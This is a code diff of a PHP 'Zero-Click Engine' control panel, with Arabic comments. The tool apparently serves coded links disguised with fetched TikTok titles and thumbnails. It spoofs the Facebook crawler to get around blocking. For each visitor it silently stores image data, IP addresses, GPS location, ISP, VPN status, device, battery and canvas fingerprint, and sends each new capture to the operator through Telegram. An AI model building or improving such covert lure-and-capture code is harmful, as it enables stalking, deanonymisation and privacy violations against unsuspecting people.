@@ -115,25 +115,59 @@ function sendTelegramNotification($db, $message) {
     curl_close($ch);
 }
 
+// ✅ الدالة القوية لجلب بيانات تيك توك (3 محاولات)
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
+
+    // المحاولة 1: عبر oEmbed API (الطريقة الرسمية)
     $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $oembed_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 4); 
+    curl_setopt($ch, CURLOPT_TIMEOUT, 6); 
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15');
     $response = curl_exec($ch);
     curl_close($ch);
 
     if ($response) {
         $data = json_decode($response, true);
-        if (!empty($data['title'])) $meta['title'] = $data['title'];
-        if (!empty($data['thumbnail_url'])) {
+        if (!empty($data['title']) && !empty($data['thumbnail_url'])) {
+            $meta['title'] = $data['title'];
             $meta['image'] = $data['thumbnail_url'];
             return $meta;
         }
     }
+
+    // المحاولة 2: قراءة صفحة الويب مباشرة (تجاوز الحظر)
+    $ch_alt = curl_init();
+    curl_setopt($ch_alt, CURLOPT_URL, $url);
+    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 6);
+    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
+    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
+    $html = curl_exec($ch_alt);
+    curl_close($ch_alt);
+
+    if ($html) {
+        $dom = new DOMDocument();
+        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
+        $xpath = new DOMXPath($dom);
+
+        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
+        if ($titleNodes->length > 0) {
+            $val = trim($titleNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['title'] = $val;
+        }
+
+        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
+        if ($imageNodes->length > 0) {
+            $val = trim($imageNodes->item(0)->nodeValue);
+            if (!empty($val)) $meta['image'] = $val;
+        }
+    }
+
     return $meta;
 }
 
@@ -237,7 +271,7 @@ if (isset($_GET['r'])) {
                 $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                 $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
 
-                // ✅ تعديل إشعار التلجرام (حذف الشاشة وكرت الشاشة، إضافة المنفذ والموديل)
+                // إشعار تلجرام
                 $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
                 $msg .= "📱 <b>الموديل:</b> {$device}\n";
                 $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
@@ -420,7 +454,7 @@ $captures = $stmt->fetchAll();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel - V10</title>
+    <title>Control Panel - V10.1</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -503,7 +537,7 @@ $captures = $stmt->fetchAll();
         <div class="header-flex">
             <div>
                 <h1>Control Panel</h1>
-                <p class="subtitle">Zero-Click Engine V10 (Custom Fields)</p>
+                <p class="subtitle">Zero-Click Engine V10.1 (Fixed Meta)</p>
             </div>
             <div style="text-align: left;">
                 <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
@@ -584,7 +618,6 @@ $captures = $stmt->fetchAll();
                                 <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
                                 <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
                                 
-                                <!-- ✅ تم استبدال كرت الشاشة والشاشة بالمنفذ والموديل -->
                                 <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>Port:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['port']); ?></span></div>
                                 <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                 <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
